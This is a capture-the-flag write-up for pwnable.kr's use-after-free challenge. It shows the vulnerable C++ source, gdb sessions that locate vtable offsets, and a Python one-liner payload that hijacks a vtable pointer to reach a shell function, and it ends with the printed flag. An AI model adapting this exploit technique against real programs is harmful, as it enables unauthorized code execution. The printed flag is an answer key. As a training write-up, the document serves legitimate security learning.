# Use After Free CTF @ pwnable.kr

ssh uaf@pwnable.kr -p2222
password guest

# Files for CTF

```sh
uaf@ubuntu:~$ ls
flag  uaf  uaf.cpp
```

# Source code shows a private function called give_shell, switch case based on input e.g. use, after, free.. and two arguments given at runtime, argv[1] is a length, argv[2] is a file name

```sh
uaf@ubuntu:~$ cat uaf.cpp
```

```c
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;

                switch(op){
                        case 1:
                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout << "your data is allocated" << endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                        break;
                }
        }

        return 0;
```

# Try to compile locally

```sh
root@kali:~/CTF/UAF# g++ -g uaf.cpp -o uaf.out
root@kali:~/CTF/UAF# gdb uaf.out
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```
# Check kernel version

```sh
uaf@ubuntu:~$ file uaf
uaf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=d53a1af6662f8b353529d5ee7afc6bf40fea6630, not stripped
```

# Disable PIE & recompile

```sh
root@kali:~/CTF/UAF# rm uaf.out
root@kali:~/CTF/UAF# g++ -g -no-pie uaf.cpp -o uaf.out
```

# Don't have 2.6.24 headers, so we just copy the file

```sh
root@kali:~/CTF/UAF# ssh uaf@pwnable.kr -p2222 "cat uat" > uaf
root@kali:~/CTF/UAF# md5sum uaf
fa143b11fb7e1995ed3aa612d35d9e18  uaf
```

# Debug, break on main

```sh
root@kali:~/CTF/UAF# gdb uaf
gdb-peda$ set disassembly-flavor intel
gdb-peda$ break main
gdb-peda$ run 
gdb-peda$ pdisass
```

# Check objects in question. Man and woman, extend from human class

```sh
root@kali:~/CTF/UAF# gdb -batch -ex 'file uaf' -ex 'disassemble main'
```

# Vtable pointer for x64 = 8 bytes, string pointer for x64 = 8 bytes, and int pointer for x64 = 8 bytes. 8*3 = 24 bytes per "Human" object

# Determine code execution primitive. obvious...

```sh
gdb-peda$ run
Starting program: /root/CTF/UAF/uaf 
1. use
2. after
3. free
3
1. use
2. after
3. free
1

Segmentation fault
```

# Locate give_shell pointer(s)

```sh
gdb-peda$ info function give_shell
0x000000000040117a  Human::give_shell()
gdb-peda$ find 0x000000000040117a
Found 6 results, display max 6 items:
uaf : 0x401550 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
uaf : 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
uaf : 0x401590 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
uaf : 0x601550 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
uaf : 0x601570 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
uaf : 0x601590 --> 0x40117a (<_ZN5Human10give_shellEv>:	push   rbp)
```

# Step through until code exec primitive. Always stops at 0x400fd8

```sh
gdb-peda$ break *0x400fcd
   0x400fcd <main+265>:	mov    rax,QWORD PTR [rbp-0x38]
   0x400fd1 <main+269>:	mov    rax,QWORD PTR [rax]
   0x400fd4 <main+272>:	add    rax,0x8
=> 0x400fd8 <main+276>:	mov    rdx,QWORD PTR [rax]
   0x400fdb <main+279>:	mov    rax,QWORD PTR [rbp-0x38]
   0x400fdf <main+283>:	mov    rdi,rax
   0x400fe2 <main+286>:	call   rdx

Stopped reason: SIGSEGV
```

# Check arguments to uaf. First argv[1] is length. Second argv[2] is a file.

```c
len = atoi(argv[1]);
data = new char[len];
read(open(argv[2], O_RDONLY), data, len);
```

# Test with 24 bytes

```sh
root@kali:~/CTF/UAF# python -c 'print "\xCC"*24' > buffer.txt
root@kali:~/CTF/UAF# gdb --args uaf 24 buffer.txt
gdb-peda$ break *main+276
gdb-peda$ run
1. use
2. after
3. free
3
1. use
2. after
3. free
2
1. use
2. after
3. free
1

RAX: 0x8 
RBX: 0x614ca0 --> 0xcccccccccccccccc
```

# Spoiler, two objects therefore two "use" to copy into memory

```sh
gdb-peda$ run 
1. use
2. after
3. free
3
1. use
2. after
3. free
2
1. use
2. after
3. free
2
1. use
2. after
3. free
1

RAX: 0xccccccccccccccd4 
RBX: 0x614ca0 --> 0xcccccccccccccccc
gdb-peda$ print /x 0xccccccccccccccd4 - 0xcccccccccccccccc
$1 = 0x8
```

# Replace pointer to give_shell+0x08

```sh
gdb-peda$ print /x 0x601590 - 0x08
$1 = 0x601588
```

# Test Shellcode

```sh
root@kali:~/CTF/UAF# python -c 'import struct;import sys;sys.stdout.write(struct.pack("<I", 0x601588) + "\x00"*(24-4))' > exploit
root@kali:~/CTF/UAF# ./uaf 24 exploit
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
#id
#uid=0(root) gid=0(root) groups=0(root)
```

# Flag

```sh
root@kali:~/CTF/UAF# ssh uaf@pwnable.kr -p2222 
uaf@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
Last login: Thu Mar 23 09:31:11 2017 from 2.105.190.96
uaf@ubuntu:~$ python -c 'import struct;import sys;sys.stdout.write(struct.pack("<I", 0x601588) + "\x00"*(24-4))' > /tmp/exploit
uaf@ubuntu:~$ ./uaf 24 /tmp/exploit
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag
yay_f1ag_aft3r_pwning

```